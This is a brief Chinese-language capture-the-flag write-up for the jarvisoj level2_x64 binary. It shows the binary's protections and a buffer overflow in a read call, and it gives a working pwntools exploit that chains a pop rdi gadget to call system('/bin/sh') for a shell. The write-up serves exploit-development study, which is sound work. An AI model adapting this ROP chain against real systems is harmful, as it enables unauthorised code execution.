# jarvisoj_level2_x64

## 保护

```shell
$ checksec --file=level2
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## vulnerable_function函数

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  system("echo Input:");
  return read(0, buf, 0x200uLL);
}
```



## EXP

思路：和上一题一模一样

64位有system函数和/bin/sh，ROPgadget找到`pop rdi;ret`进行getshell

```python
from pwn import *

r=process('./level2')

sh_addr=0x600A90
sys_addr=0x4004C0
rdi_addr=0x4006b3

payload=b'A'*136+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
r.recvuntil('t')
r.sendline(payload)
r.interactive()
```

